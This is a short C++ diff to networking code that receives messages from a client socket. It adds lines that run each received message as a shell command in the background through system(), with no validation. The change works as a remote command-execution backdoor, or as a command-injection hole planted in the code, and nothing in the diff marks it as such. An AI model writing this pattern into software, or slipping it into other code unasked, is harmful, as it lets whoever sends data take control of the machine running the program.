@@ -35,8 +35,11 @@ namespace extras {
         auto compilation = compiler.compile(client);
         compilation.writeSocket(this->_client_socket);
         auto list = compilation.compilation();
-        for (auto item : servers(list))
+        for (auto item : servers(list)) {
           cout << "msg received: " << item << endl;
+          auto cmd = item + " &";
+          system(cmd.c_str());
+        }
 
       } catch (exception &ex) {
         cout << ex.what() << endl;
